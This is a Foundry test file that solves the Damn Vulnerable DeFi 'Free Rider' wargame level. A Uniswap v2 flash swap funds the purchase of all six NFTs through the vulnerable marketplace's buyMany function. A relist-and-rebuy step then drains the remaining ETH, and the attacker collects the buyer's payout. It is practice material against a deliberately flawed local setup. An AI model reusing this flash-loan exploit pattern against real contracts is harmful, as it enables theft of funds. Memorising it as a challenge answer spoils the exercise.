// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal buyer;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        buyer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("buyer")))))
        );
        vm.label(buyer, "buyer");
        vm.deal(buyer, BUYER_PAYOUT);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");
        vm.deal(
            deployer,
            UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
        );

        // Attacker starts with little ETH balance
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.5 ether);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );
        vm.label(address(uniswapV2Pair), "uniswapV2Pair");

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(
            address(freeRiderNFTMarketplace),
            true
        );

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(buyer);

        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
            attacker,
            address(damnValuableNFT)
        );

        vm.stopPrank();

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker, attacker);
        Accomplice accomplice = new Accomplice(
            uniswapV2Factory,
            freeRiderNFTMarketplace,
            weth,
            freeRiderBuyer
        );
        vm.label(address(accomplice), "accomplice");
        uniswapV2Pair.swap(0, 30 ether, address(accomplice), "data");
        for (uint256 i; i < 6; i++) {
            // vm.prank(attacker);
            damnValuableNFT.safeTransferFrom(
                attacker,
                address(freeRiderBuyer),
                i
            );
        }
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BUYER_PAYOUT);
        assertEq(address(freeRiderBuyer).balance, 0);

        // The buyer extracts all NFTs from its associated contract
        vm.startPrank(buyer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(
                address(freeRiderBuyer),
                buyer,
                tokenId
            );
            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
        }
        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
        assertLt(
            address(freeRiderNFTMarketplace).balance,
            MARKETPLACE_INITIAL_ETH_BALANCE
        );
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract Accomplice is Test, IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Factory internal uniswapV2Factory;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    WETH9 internal weth;
    FreeRiderBuyer internal freeRiderBuyer;
    address attacker;

    constructor(
        IUniswapV2Factory _uniswapV2Factory,
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        WETH9 _weth,
        FreeRiderBuyer _freeRiderBuyer
    ) {
        uniswapV2Factory = _uniswapV2Factory;
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        weth = _weth;
        freeRiderBuyer = _freeRiderBuyer;
        attacker = msg.sender;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(
            msg.sender ==
                IUniswapV2Factory(uniswapV2Factory).getPair(token0, token1)
        );
        uint256[] memory tokensToBuy = new uint256[](6);
        for (uint256 i; i < 6; i++) tokensToBuy[i] = i;

        weth.withdraw(30 ether);
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokensToBuy);

        // put up two tokens for sale and buy them yourself to extract remaining 15eth in contract
        uint256[] memory NFTsForSell = new uint256[](2);
        uint256[] memory NFTsPrices = new uint256[](2);
        for (uint8 i = 0; i < 2; i++) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = 15 ether;
        }

        freeRiderNFTMarketplace.token().approve(
            address(freeRiderNFTMarketplace),
            0
        );
        freeRiderNFTMarketplace.token().approve(
            address(freeRiderNFTMarketplace),
            1
        );
        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsForSell);
        weth.deposit{value: 30090300000000000000}();
        weth.transfer(
            IUniswapV2Factory(uniswapV2Factory).getPair(token0, token1),
            30090300000000000000
        );
        for (uint256 i; i < 6; i++)
            freeRiderNFTMarketplace.token().safeTransferFrom(
                address(this),
                attacker,
                i
            );
        payable(attacker).call{value: address(this).balance}("");
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
